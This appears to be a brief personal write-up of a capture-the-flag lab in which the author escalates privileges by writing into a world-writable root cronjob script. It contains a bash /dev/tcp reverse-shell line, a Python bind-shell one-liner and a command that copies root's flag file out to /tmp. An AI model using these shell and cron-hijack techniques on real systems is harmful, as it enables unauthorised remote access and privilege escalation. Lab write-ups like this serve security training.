
[...back](../0-landing-ncsaoscp.md)

# 1 brief

iptarget
ports: 22,4200
mission: /tmp/schedule.sh on target runs every minute. flag at /root/flag_???.txt
access cred = noob:N00bP@ssw0rd

---

# 2

kali: 184.22.230.65 
target: 34.124.215.211
port: 10000

```
>>> then many steps, many attempts, just to end up weird <<<
```

---

# 3 what really happened

```
try to use target as local host to receive shell, and got weird. so, hijack this lab with its own cronjob.
```

```
localhost to receive shell
> access noob (1 instance is fine)
> technically, reverse attack starts move with passive listener (nc -nvlp port) on attacker then target active listen to attacker with shell.
> with this context, schedule.sh is the target which runs every 1 min... so we can start from here first, then run passive listener
> > noob> which nc # there is no nc... there are bash and python 2 at least
> > /bin/bash -i >& /dev/tcp/localhost/4444 0>&1 # in schedule.sh
> > noob> 
		python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('0.0.0.0',4444));s.listen(1);conn,addr=s.accept();print 'Connection from', addr;os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(['/bin/sh','-i'])"
		
> wait... connection came in
> > `netstat -tulnp` # verify the connection, need another instance

> `whoami`
> ... no response for a very long time, even repeating with other commands ... may be, it is stuck?
> > `netstat -tulnp` # show a lot of process keep generated and nothing response
> > > bet it's bug haha

and i felt... just get the flag
```

```
hijack cronjob
> investigation confirms that schedule.sh is likely run the command as root
> > it is always easier to be direct... ask root to get flag, not shell

> cat /root/flag* > /tmp/zaddy.txt

done
```

[...back](../0-landing-ncsaoscp.md)
